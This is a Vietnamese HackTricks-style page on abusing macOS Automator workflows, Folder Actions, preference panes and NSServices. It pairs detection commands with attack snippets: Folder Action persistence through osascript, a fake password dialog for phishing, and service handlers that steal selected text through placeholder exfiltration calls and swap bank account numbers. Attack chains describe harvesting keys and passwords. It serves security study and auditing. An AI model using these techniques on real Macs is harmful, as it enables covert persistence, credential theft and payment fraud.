# Lạm dụng macOS Automator, Preference Panes & NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Thông tin cơ bản

**Automator** là công cụ tự động hóa trực quan của macOS. Công cụ này thực thi **workflows** (bundle `.workflow`) gồm các **actions** (bundle `.action`). Automator cũng hỗ trợ tích hợp **Folder Actions**, **Quick Actions** và **Shortcuts**. Trên các phiên bản macOS hiện đại, workflows cũng có thể được **nhập vào Shortcuts**, nên cùng một logic độc hại có thể xuất hiện dưới dạng Finder Quick Action, user service trong `~/Library/Services/` hoặc shortcut được hỗ trợ bởi các Automator action cũ.

Automator actions là **plugin** được tải vào Automator runtime khi một workflow chạy. Chúng có thể:
- Thực thi shell script tùy ý
- Xử lý file và dữ liệu
- Tương tác với ứng dụng thông qua AppleScript
- Kết hợp với nhau để thực hiện các tác vụ tự động hóa phức tạp

### Vì sao điều này quan trọng

> [!WARNING]
> Kẻ tấn công có thể **dùng kỹ thuật social engineering** để khiến người dùng chạy Automator workflows — chúng trông như các file tài liệu thông thường. Bundle `.workflow` có thể chứa shell command được nhúng và thực thi khi workflow chạy. Khi kết hợp với Folder Actions, chúng tạo ra cơ chế **persistence tự động** được kích hoạt bởi các sự kiện file. Các bản sửa lỗi Gatekeeper gần đây cũng cho thấy **Quick Actions đi kèm ứng dụng** (`Contents/PlugIns/*.workflow`) phải được xem là nội dung có thể thực thi, không phải dữ liệu vô hại.

### Khám phá

```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id  
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```

### Tấn công: Workflow được thiết kế bằng kỹ thuật social engineering

Một bundle `.workflow` trông giống như một tệp tài liệu thông thường đối với hầu hết người dùng:

```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>AMApplicationBuild</key>
    <string>523</string>
    <key>AMApplicationVersion</key>
    <string>2.10</string>
    <key>actions</key>
    <array>
        <dict>
            <key>action</key>
            <dict>
                <key>AMActionVersion</key>
                <string>2.0.3</string>
                <key>AMApplication</key>
                <array>
                    <string>Automator</string>
                </array>
                <key>AMBundleID</key>
                <string>com.apple.RunShellScript</string>
            </dict>
        </dict>
    </array>
</dict>
</plist>
PLIST
```

### Tấn công: Duy trì tồn tại bằng Folder Action

Folder Actions tự động thực thi một workflow khi tệp được thêm vào thư mục được giám sát:

```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
    make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
    tell folder action "Downloads"
        make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
    end tell
    set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```

> [!CAUTION]
> Folder Actions vẫn tồn tại sau khi khởi động lại và chạy âm thầm. Folder Action trên `~/Downloads` có nghĩa là **mọi tệp được tải xuống đều kích hoạt payload của bạn** — bao gồm các tệp từ Safari, Chrome, AirDrop và tệp đính kèm email. Cũng lưu ý rằng `System Events` có thể đăng ký Folder Actions trỏ đến các script bên ngoài vị trí mặc định `~/Library/Scripts/Folder Action Scripts`, vì vậy việc truy tìm các đường dẫn không nằm trong thư mục mặc định là đáng làm. Để biết các tác động liên quan đến TCC, hãy xem [trang TCC](../macos-security-protections/macos-tcc/README.md).

---

## Các bảng tùy chọn

### Thông tin cơ bản

Các bảng tùy chọn (bundle `.prefPane`) là plugin được tải bởi **System Settings** (trước đây là System Preferences). Chúng cung cấp các bảng giao diện cấu hình cho các tính năng của hệ thống hoặc bên thứ ba. Trên các hệ thống cũ, chúng được tải trực tiếp bởi `System Preferences`; trên các bản phát hành mới hơn, các bảng của bên thứ ba thường được trung gian xử lý bởi một **dịch vụ XPC loader cũ** được khởi chạy từ System Settings.

### Vì sao điều này quan trọng

- Các bảng tùy chọn chạy trong một **tiến trình host đáng tin cậy** do System Settings / System Preferences khởi chạy
- Trên các hệ thống hiện đại, host đó có thể là một **dịch vụ XPC `legacyLoader`**, vì vậy ranh giới quan trọng vẫn là **tiến trình giao diện người dùng Apple đáng tin cậy -> tải mã bên thứ ba**
- Các bảng tùy chọn của bên thứ ba kế thừa **ngữ cảnh bảo mật của tiến trình host** và mức độ tin cậy của người dùng gắn với giao diện đó
- Người dùng cài đặt các bảng tùy chọn bằng cách **nhấp đúp** vào chúng — rất dễ bị social engineering
- Sau khi được cài đặt, chúng **duy trì tồn tại** và được tải mỗi khi System Settings mở đến bảng đó

### Tìm kiếm

```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```

### Attack: Privilege Context Hijacking

Một ngăn tùy chọn độc hại kế thừa ngữ cảnh bảo mật của **tiến trình host của ngăn tùy chọn** (trước đây là `System Preferences`; trên các phiên bản mới hơn thường là helper `legacyLoader` được `System Settings` khởi chạy):

```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
    [super mainViewDidLoad];
    // This code runs inside the preference-pane host process
    // It inherits that host's permissions / trust relationship
    
    // Example: read files accessible to System Settings
    NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];
    
    // Example: use Accessibility API if System Settings has it
    AXUIElementRef systemWide = AXUIElementCreateSystemWide();
    // ... control other applications
}
@end
```

### Tấn công: Duy trì quyền truy cập thông qua cài đặt

```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```

### Attack: UI Phishing

Một preference pane có thể giả mạo các bảng điều khiển UI hệ thống hợp pháp để **phishing nhằm lấy thông tin xác thực**:

```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```

---

## NSServices

### Thông tin cơ bản

**NSServices** cho phép ứng dụng cung cấp chức năng cho các ứng dụng khác thông qua **menu Services** (nhấp chuột phải → Services). Khi người dùng chọn văn bản hoặc dữ liệu và gọi một service, dữ liệu đã chọn sẽ được **gửi đến nhà cung cấp service** để xử lý.

Các service được khai báo trong `Info.plist` của ứng dụng, bên dưới khóa `NSServices`, và được đăng ký với pasteboard server (`pbs`). macOS cũng duy trì **service cache** và **chính sách hạn chế** để quyết định những service nào hiển thị và liệu các ứng dụng sandbox có nhận thêm cảnh báo hay không.

### Vì sao điều này quan trọng

- Services nhận **luồng dữ liệu giữa các ứng dụng** — văn bản được chọn từ bất kỳ ứng dụng nào đều được gửi đến service
- Một service độc hại có thể thu thập dữ liệu từ trình quản lý mật khẩu, ứng dụng email và ứng dụng tài chính
- Services có thể **trả dữ liệu đã sửa đổi** về ứng dụng gọi (man-in-the-middle trong các thao tác với vùng chọn)
- Tên service có thể được tạo để trông hợp pháp ("Format Text", "Encrypt Selection", "Share")
- Cờ `NSRestricted` không bắt buộc nhưng liên quan đến bảo mật: service được đánh dấu không bị hạn chế có thể được ứng dụng sandbox gọi mà không có cảnh báo mà macOS hiển thị cho các service có nguy cơ thoát sandbox<sup>[[2]](#references)</sup>

### Khám phá

```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```

### Tấn công: Dịch vụ đánh chặn dữ liệu

```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
    <dict>
        <key>NSMessage</key>
        <string>processSelection</string>
        <key>NSPortName</key>
        <string>EvilService</string>
        <key>NSSendTypes</key>
        <array>
            <string>NSStringPboardType</string>
        </array>
        <key>NSMenuItem</key>
        <dict>
            <key>default</key>
            <string>Format Selected Text</string>
        </dict>
    </dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
               userData:(NSString *)userData
                  error:(NSString **)error {
    NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];
    
    // selectedText contains whatever the user selected in any app
    // Could be a password, credit card number, private message, etc.
    
    // Exfiltrate the captured data
    [self sendToC2:selectedText];
    
    // Optionally return the text unchanged so user doesn't notice
    [pboard clearContents];
    [pboard setString:selectedText forType:NSPasteboardTypeString];
}
```

### Tấn công: Sửa đổi dữ liệu (Man-in-the-Middle)

Một service có thể **sửa đổi dữ liệu được trả về** trong khi vẫn có vẻ đang cung cấp một chức năng hợp pháp:

```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
             userData:(NSString *)userData
                error:(NSString **)error {
    NSString *original = [pboard stringForType:NSPasteboardTypeString];
    
    // Log the original data (credential capture)
    [self exfiltrate:original];
    
    // Return modified data (e.g., replace bank account in a wire transfer)
    NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
                                                            withString:@"attacker-account"];
    [pboard clearContents];
    [pboard setString:modified forType:NSPasteboardTypeString];
}
```

### Restricted Services & Modern Abuse

Apple hỗ trợ boolean tùy chọn `NSRestricted` cho từng định nghĩa service. Nếu được đặt, macOS sẽ cảnh báo các caller chạy trong sandbox vì service đó có thể giúp họ **thoát khỏi ranh giới sandbox hoặc quyền riêng tư**. Từ góc độ tấn công, điều này mở ra hai hướng audit hữu ích:

- Tìm các service của bên thứ ba **không được đánh dấu là restricted** dù chúng làm trung gian cho Apple Events, quyền truy cập file hoặc các hành động có đặc quyền khác
- Tìm các service tích hợp có giá trị cao với entitlement mạnh (ví dụ: service do Script Editor hoặc các helper dựa trên Finder cung cấp) và kiểm tra xem tương tác của người dùng có đủ để biến chúng thành một phương thức truy cập dữ liệu hay không

Một ví dụ gần đây tiêu biểu là **CVE-2022-48574**, trong đó cơ chế Services có thể bị lạm dụng để truy cập **các file người dùng được TCC bảo vệ mà không cần quy trình xác nhận như mong đợi**. Lỗi đã được khắc phục, nhưng kỹ thuật này vẫn hữu ích cho việc mô hình hóa mối đe dọa: mọi service chuyển tiếp yêu cầu truy cập file hoặc tự động hóa thay mặt caller đều cần được xem xét kỹ lưỡng tương tự.<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions là nội dung có thể thực thi**: Apple đã khắc phục một lỗi vượt qua Gatekeeper vào năm 2024, trong đó Quick Action của Automator được đóng gói trong ứng dụng có thể chạy mà không qua bước đánh giá thông thường. Khi audit ứng dụng, hãy kiểm tra `Contents/PlugIns/*.workflow/Contents/document.wflow` như cách bạn kiểm tra các script helper hoặc mục đăng nhập. Xem [trang Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts có thể kế thừa hành vi Automator cũ**: Apple cũng bổ sung lời nhắc xin sự đồng ý của người dùng sau khi phát hiện shortcut của bên thứ ba sử dụng **một action Automator cũ** để gửi Apple Events mà không qua quy trình cấp quyền như mong đợi. Cần xem xét các workflow đã nhập và bundle shortcut để tìm `Run AppleScript`, `Run Shell Script` và các action cầu nối tương tự. Xem [trang TCC](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
- **Automator vẫn là một ranh giới quyền riêng tư đang hoạt động**: Năm 2025, Apple đã phát hành thêm một bản sửa lỗi Automator liên quan đến quyền truy cập dữ liệu người dùng được bảo vệ. Dù Automator là một bề mặt cũ, hãy xem mọi trình chạy workflow, host Quick Action hoặc cầu nối tự động hóa là bề mặt tấn công hiện hữu, không phải mã đã lỗi thời.<sup>[[4]](#references)</sup>

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting

```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```

### Ngăn tùy chọn → Leo thang TCC

```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```

### NSService → Đánh cắp Password Manager

```
1. Register a service named "Secure Copy" 
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```

## References

- [1] [Apple — Giới thiệu về nội dung bảo mật của macOS Ventura 13.7, Sonoma 14.7 và Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Cách thức khai thác NSServices hoạt động trên macOS](https://moonlock.com/nsservices-macos)
- [3] [Apple — Giới thiệu về nội dung bảo mật của macOS Sonoma 14.6 (CVE-2024-40834)](https://support.apple.com/en-us/120911)
- [4] [Apple — Giới thiệu về nội dung bảo mật của macOS Sequoia 15.4 (CVE-2025-30460)](https://support.apple.com/en-us/122373)
{{#include ../../../banners/hacktricks-training.md}}
